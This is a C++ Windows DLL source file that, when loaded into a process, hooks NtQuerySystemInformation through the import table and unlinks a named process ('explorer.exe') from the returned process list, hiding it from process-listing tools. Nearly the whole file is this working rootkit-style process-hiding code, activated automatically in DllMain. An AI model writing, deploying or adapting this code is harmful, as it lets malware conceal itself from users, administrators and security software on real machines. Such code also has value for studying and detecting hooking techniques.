#include "LdrHeader.h"
#include <winternl.h>

#ifndef _WIN64
#error "this project must Compile in x64"
#endif // !_WIN64


#pragma comment(lib,"user32.lib")

CONST static std::wstring gwsProcName = L"explorer.exe"; // ingrone character case

struct NEW_SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	UNICODE_STRING ImageName;
	LONG BasePriority;
	HANDLE UniqueProcessId;
	PVOID Reserved2;
	ULONG HandleCount;
	ULONG SessionId;
	PVOID Reserved3;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG Reserved4;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	PVOID Reserved5;
	SIZE_T QuotaPagedPoolUsage;
	PVOID Reserved6;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved7[6];
};

template<typename T, typename _fnPtr>
static std::basic_string<T> MakeTextTo(_In_ CONST std::basic_string<T>& wsText, _In_ _fnPtr fnPtr)
{
	std::basic_string<T> tmpText;
	for (auto& itm : wsText)
		tmpText.push_back(static_cast<T>(fnPtr(itm)));

	return tmpText;
}

template<typename T>
static std::basic_string<T> MakeTextToLower(_In_ CONST std::basic_string<T>& wsText)
{
	return MakeTextTo(wsText, tolower);
}

using NtQuerySystemInformationPtr = NTSTATUS(WINAPI *)(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength);

NtQuerySystemInformationPtr RealNtQuerySystemInformationPtr = nullptr;

NTSTATUS WINAPI NewNtQuerySystemInformation(_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength)
{
	if (SystemInformationClass != SystemProcessInformation)
	{
		return RealNtQuerySystemInformationPtr(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	}

	
	NTSTATUS NtRetCode = RealNtQuerySystemInformationPtr(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(NtRetCode))
	{
		NEW_SYSTEM_PROCESS_INFORMATION * pPrevent = NULL;
		for (NEW_SYSTEM_PROCESS_INFORMATION * pCurrent = (NEW_SYSTEM_PROCESS_INFORMATION *)SystemInformation; ; pCurrent = (NEW_SYSTEM_PROCESS_INFORMATION *)((PUCHAR)pCurrent + pCurrent->NextEntryOffset))
		{
			// break linktable
			if (pCurrent->ImageName.Buffer != NULL && MakeTextToLower(std::wstring(pCurrent->ImageName.Buffer)) == gwsProcName)
			{
				if (pCurrent->NextEntryOffset == NULL)
				{
					pPrevent->NextEntryOffset = NULL;
					break;
				}
				else
				{
					pPrevent->NextEntryOffset += pCurrent->NextEntryOffset;
					continue;
				}
			}
			else if (pCurrent->NextEntryOffset == NULL)
			{
				break;
			}


			pPrevent = pCurrent;
		}
	}
	return NtRetCode;
}

VOID StartHook()
{
	if (!CLdrHeader::IATHook("ntdll.dll","NtQuerySystemInformation", NewNtQuerySystemInformation, reinterpret_cast<void **>(&RealNtQuerySystemInformationPtr)))
	{
		::MessageBoxW(NULL, L"Hook Faild...", L"", NULL);
	}
}

VOID StopHook()
{
	if (RealNtQuerySystemInformationPtr != nullptr)
	{
		CLdrHeader::IATHook("ntdll.dll", "NtQuerySystemInformation", RealNtQuerySystemInformationPtr, reinterpret_cast<void **>(&RealNtQuerySystemInformationPtr));
		RealNtQuerySystemInformationPtr = nullptr;
	}
}

BOOL WINAPI DllMain(_In_ HINSTANCE, _In_ DWORD fdwReason, _In_ LPVOID)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		StartHook();
		return TRUE;
	case DLL_PROCESS_DETACH:
		StopHook();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	default:
		break;
	}

	return FALSE;
}